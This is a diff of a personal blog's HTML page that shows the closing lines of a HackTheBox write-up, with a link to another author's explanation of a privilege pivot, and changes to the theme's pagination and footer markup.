 <p>EDIT: Here how the pivot was possible : <a href="https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby">https://0xdf.gitlab.io/2019/12/07/htb-wall.html#priv-www-data--shelby</a></p>
 <p>As always do not hesitate to contact me for any questions or feedbacks.</p>
 <p>See you next time !</p>
 <p>-hg8</p>
 
-      </div></div>
-  
-  <div class="pagination">
-    <div class="pagination__title">
-      <span
-        class="pagination__title-h">Read other posts</span>
-      <hr />
     </div>
-    <div class="pagination__buttons">
+    
       
-      <span class="button previous">
-        <a href="/posts/craft/">
-          <span class="button__icon">←</span>
-          <span class="button__text">Craft - HackTheBox</span>
-        </a>
-      </span>
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/craft/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Craft - HackTheBox</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/networked/">
+                  <span class="button__text">Networked - HackTheBox</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
       
+    
+
+
+    
       
-      <span class="button next">
-        <a href="/posts/jarvis/">
-          <span class="button__text">Jarvis - HackTheBox</span>
-          <span class="button__icon">→</span>
-        </a>
-      </span>
+        
+
       
+    
+
     </div>
-  </div>
-  
 
-  
+      </div>
 
-</div>
-
-  </div>
-
-  
-    <footer class="footer">
+      
+        <footer class="footer">
   <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
-    
-        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      <div class="footer__content">
+        <span>© 2020</span>
+        <span><a href="https://hg8.rocks" target="_blank" rel="noopener">hg8</a></span>
+        <span><a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 20" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+            </a></span>
       </div>
+    
   </div>
 </footer>
+
+
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
 
+      
+    </div>
 
-
-
-
-  
-</div>
-
-</body>
+    
+  </body>
 </html>
